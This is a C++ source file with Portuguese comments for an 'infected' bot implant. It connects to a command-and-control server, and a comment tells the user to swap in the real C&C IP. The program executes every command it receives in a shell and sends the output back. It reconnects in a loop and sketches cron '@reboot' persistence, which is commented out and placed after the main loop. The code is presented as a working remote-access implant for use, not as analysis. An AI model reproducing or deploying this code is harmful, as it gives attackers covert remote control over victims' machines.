// infected.cpp  (bot / implant / máquina infectada)
// Compilar:  g++ -o infected infected.cpp -std=c++17 -Wall -Wextra -pthread
// Executar:  ./infected

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

constexpr const char* C2_IP       = "127.0.0.1";    // ← MUDE PARA O IP REAL DO SEU SERVIDOR C&C
constexpr int        C2_PORT      = 9096;
constexpr size_t     BUFFER_SIZE  = 8192;
constexpr int        RECONNECT_DELAY = 10;         // segundos entre tentativas de reconexão

volatile sig_atomic_t should_run = 1;

void sigint_handler(int) {
    should_run = 0;
}

bool send_all(int sock, const std::string& data) {
    size_t total = 0;
    while (total < data.size()) {
        ssize_t sent = send(sock, data.data() + total, data.size() - total, MSG_NOSIGNAL);
        if (sent <= 0) return false;
        total += sent;
    }
    return true;
}

std::string exec_command(const std::string& cmd) {
    std::string result;
    FILE* pipe = popen((cmd + " 2>&1").c_str(), "r");  // redireciona stderr também
    if (!pipe) {
        return "(erro ao executar popen)\n";
    }

    char buffer[BUFFER_SIZE];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    pclose(pipe);
    return result.empty() ? "(sem saída)\n" : result;
}

int connect_to_c2() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) return -1;

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);

    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == -1) {
        close(sock);
        return -1;
    }

    return sock;
}

int main() {
    signal(SIGINT, sigint_handler);
    signal(SIGPIPE, SIG_IGN);

    std::cout << "[infected] Iniciando... tentando conectar em " << C2_IP << ":" << C2_PORT << "\n";

    while (should_run) {
        int sock = connect_to_c2();
        if (sock == -1) {
            std::cerr << "[infected] Falha na conexão. Tentando novamente em " << RECONNECT_DELAY << "s...\n";
            sleep(RECONNECT_DELAY);
            continue;
        }

        std::cout << "[infected] Conectado ao C2!\n";

        char buf[BUFFER_SIZE];
        while (should_run) {
            ssize_t n = recv(sock, buf, sizeof(buf) - 1, 0);
            if (n <= 0) {
                // servidor fechou ou erro
                break;
            }
            buf[n] = '\0';

            std::string command = buf;
            // remove \n ou \r\n no final
            while (!command.empty() && (command.back() == '\n' || command.back() == '\r')) {
                command.pop_back();
            }

            if (command.empty()) continue;

            // Aqui você pode adicionar comandos especiais, ex:
            if (command == "ping") {
                send_all(sock, "pong\n");
                continue;
            }
            else if (command == "exit" || command == "quit") {
                send_all(sock, "saindo...\n");
                should_run = 0;
                break;
            }

            std::cout << "[infected] Recebido: " << command << "\n";

            

            // Executa como shell normal
            std::string output = exec_command(command);

            // Envia de volta
            if (!send_all(sock, output)) {
                break;  // falhou ao enviar → reconecta
            }
        }

        close(sock);
        std::cout << "[infected] Conexão perdida. Reconectando em " << RECONNECT_DELAY << "s...\n";
        sleep(RECONNECT_DELAY);
    }
    // configurando persistencia
    // pegando o caminho do executável atual
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
    if (len != -1) {
        path[len] = '\0';
        std::string cron_entry = "@reboot " + std::string(path) + "\n";
        // Adiciona a entrada ao crontab do usuário
        std::string cmd = "echo '" + cron_entry + "' | crontab -";
        // system(cmd.c_str());
        std::cout << "[infected] Persistência configurada via cron: " << cron_entry;
    } else {
        std::cerr << "[infected] Falha ao obter caminho do executável para persistência.\n";
    }

    return 0;
}